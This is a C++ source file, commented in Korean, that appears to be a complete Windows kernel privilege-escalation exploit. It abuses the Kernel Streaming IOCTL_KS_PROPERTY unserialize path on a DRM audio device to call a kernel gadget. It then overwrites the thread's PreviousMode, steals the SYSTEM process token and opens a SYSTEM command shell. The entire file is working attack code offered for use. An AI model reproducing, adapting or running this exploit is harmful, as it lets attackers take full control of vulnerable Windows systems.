#define _INC_MMREG
#define __STREAMS__

#include <Windows.h>
#include <winternl.h>
#include <strmif.h>
#include <ks.h>
#include <ksproxy.h>
#include <ksmedia.h>
#include <stdio.h>
#include <SetupAPI.h>
#include <functiondiscovery.h>
#include <mmdeviceapi.h>
#include <stdint.h>
#include <safeint.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <winsvc.h>
#include <processthreadsapi.h>

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "Advapi32.lib")

#define SystemHandleInformation			0x10
#define SystemModuleInformation         11
#define TOKEN_SIZE              0x8

extern "C"{
	NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
}

typedef struct SYSTEM_MODULE{
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[255];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION{
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

__inline void* Ptr64(const unsigned long long ull){
	return((void*)(ULONG_PTR)ull);
}

int32_t GetObjPtr(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle){
	int32_t Ret = -1;
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = 0;
	ULONG ulBytes = 0;
	NTSTATUS Status = STATUS_SUCCESS;

	// NtQuerySystemInformation를 통해 ulPid에 해당하는 시스템의 모든 핸들 정보를 가져온다.
	while ((Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L){
		if (pHandleInfo != NULL) pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (size_t)2 * ulBytes);
		else pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)2 * ulBytes);
	}
	if (Status != NULL){
		Ret = Status;
		goto done;
	}
	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++){    // 핸들수만큼 도는데,
	   // ulPid에 속하고, HandleValue와 handle이이 일치하는 항목을 찾으면 해당항목의 object를 반환한다.
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (unsigned short)handle)){
			*ppObjAddr = (unsigned long long)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}
done:
	if (pHandleInfo != NULL){
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}
	return Ret;
}

UINT_PTR GetKernelModuleAddress(const char* TargetModule){
	NTSTATUS status;
	ULONG ulBytes = 0;
	PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

	while ((status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH){
		if (handleTableInfo != NULL){
			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}
		else{
			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0){
		for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++){
			char* moduleName = strstr(handleTableInfo->Modules[i].Name, TargetModule);
			if (moduleName != NULL){
				return (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
			}
		}
	}
	else{
		if (handleTableInfo != NULL){
			printf("[-] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
			return 0;
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);
	return 0;
}

NTSTATUS Write64(void* Dst, void* Src, size_t Size){
	NTSTATUS Status = 0;
	PULONG cbNumOfBytesWrite = 0;

	Status = NtWriteVirtualMemory(GetCurrentProcess(), Dst, Src, Size, cbNumOfBytesWrite);
	if (!NT_SUCCESS(Status))
	{
		return -1;
	}
	return Status;
}

DWORD64 leak_gadget_address(LPCSTR GadgetName)
{
	DWORD64 module_base_kernel, gadget_address;
	HMODULE module_base_user;

	// 의존성 무시 하고 ntoskrnl.exe를 유저모드의 주소공간에 로드
	module_base_user = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!module_base_user)
		goto error;

	// 모듈에서 gadgetname에 해당하는 process의 offset을 구한다.
	gadget_address = (DWORD64)GetProcAddress(module_base_user, GadgetName);
	if (!gadget_address) {
		goto error;
	}
	// 커널에서의 해당 모듈의 베이스 주소를 구한다.
	module_base_kernel = GetKernelModuleAddress("ntoskrnl.exe");
	// gadget_addr - module_base_user 로 offset을 구하고, 이를 kernel base에 더해서 실제 주소를 구한다.
	gadget_address = module_base_kernel + (gadget_address - (DWORD64)module_base_user);

	return gadget_address;
error:
	printf("[-] leak_gadget_address failed\n");
	return FALSE;
}

#pragma pack(1)
typedef struct _EXPLOIT_DATA1{
	PVOID Destination;  // RCX
}EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2{
	char pad[0x20];
	PVOID ptr_ArbitraryFunCall;
} EXPLOIT_DATA2;

UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;
EXPLOIT_DATA2* pInBufData = (EXPLOIT_DATA2*)(pInBufProperty + 1);

UCHAR OutBuffer[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };

KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)OutBuffer;
PKSPROPERTY_SERIAL pSerial = (KSPROPERTY_SERIAL*)(pSerialHdr + 1);
EXPLOIT_DATA1* pOutBufData = (EXPLOIT_DATA1*)(pSerial + 1);

BOOL SendIoctlReq(HANDLE hDevice)
{
	BOOL res = FALSE;
	res = DeviceIoControl(hDevice, IOCTL_KS_PROPERTY, pInBufProperty, sizeof(InBuffer), pSerialHdr, sizeof(OutBuffer), NULL, NULL);
	return res;
}

int main()
{
	HANDLE hDevice = 0;
	BOOL res = FALSE;
	NTSTATUS status = 0;
	uint32_t Ret = 0;

	// hDevice = device handle 획득
	KsOpenDefaultDevice(KSCATEGORY_DRM_DESCRAMBLE, GENERIC_READ | GENERIC_WRITE, &hDevice);

	uint64_t Sysproc = 0;
	uint64_t Curproc = 0;
	uint64_t Curthread = 0;

	HANDLE hCurproc = 0;
	HANDLE hThread = 0;

	Ret = GetObjPtr(&Sysproc, 4, (HANDLE)4);
	printf("[+] System EPROCESS: 0x%llx\n", Sysproc);

	hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	if (hThread != NULL)
	{
		Ret = GetObjPtr(&Curthread, GetCurrentProcessId(), hThread);
		if (Ret != NULL) return Ret;
		printf("[+] Current KTHREAD address: %llx\n", Curthread);
	}

	hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
	if (hCurproc != NULL)
	{
		Ret = GetObjPtr(&Curproc, GetCurrentProcessId(), hCurproc);
		printf("[+] Current EPROCESS: 0x%llx\n", Curproc);
	}

	pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
	pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
	pInBufProperty->Id = 0x0;


	pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
	pSerialHdr->Count = 1;

	pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
	pSerial->Id = 0;
	pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
	pSerial->PropTypeSet.Flags = 0;
	pSerial->PropTypeSet.Id = 0x45;

	UINT_PTR nt_base = GetKernelModuleAddress("ntoskrnl.exe");
	
	void* alloc_addr = VirtualAlloc((void*)0x10000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (alloc_addr == NULL) {
		printf("[-] VirtualAlloc failed: %d\n", GetLastError());
		return -1;
	}

	memset(alloc_addr, 0, 0x1000);

	uint64_t* qwords = (uint64_t*)alloc_addr;
	uint32_t* dwords = (uint32_t*)alloc_addr;

	qwords[0x00 / 8] = Curthread + 0x232 - 0x2078; // 0x00: dst addr (8bytes)
	dwords[0x10 / 4] = 0x00000800;                 // 0x10: payload1 (4bytes) : 0x00000801 -> 0x00000800
	dwords[0x14 / 4] = 0x00100100;                 // 0x14: payload2 (4bytes) : 0x00100100

	pInBufData->ptr_ArbitraryFunCall = Ptr64(nt_base + 0x7f26f0);

	pOutBufData->Destination = Ptr64(0x10000000); // rcx = alloc_addr

	printf("\n[+] ptr_ArbitraryFunCall (jmp rax) = %p\n", pInBufData->ptr_ArbitraryFunCall);
	printf("[+] RCX will point to: %p\n", pOutBufData->Destination);

	printf("\n[+] Payload (0x10000000) dump:\n");
	for (int i = 0; i < 0x30; i += 8) {
		printf("    0x%08X: %016llx\n", 0x10000000 + i, *(uint64_t*)((uint8_t*)alloc_addr + i));
	}

	res = SendIoctlReq(hDevice);
	if (!res)
	{
		printf("[-] SendIoctlReq failed\n");
	}

	char mode = 1;
	
	Write64(Ptr64(Curproc + 0x4b8), Ptr64(Sysproc + 0x4b8), TOKEN_SIZE); // eprocess token offset : 0x4b8
	
	Write64(Ptr64(Curthread + 0x232), &mode, sizeof(mode)); // previousMode offset : 0x232

	printf("\n[+] Exploit complete. Spawning SYSTEM shell.\n");
	system("cmd.exe");

	return 0;
}
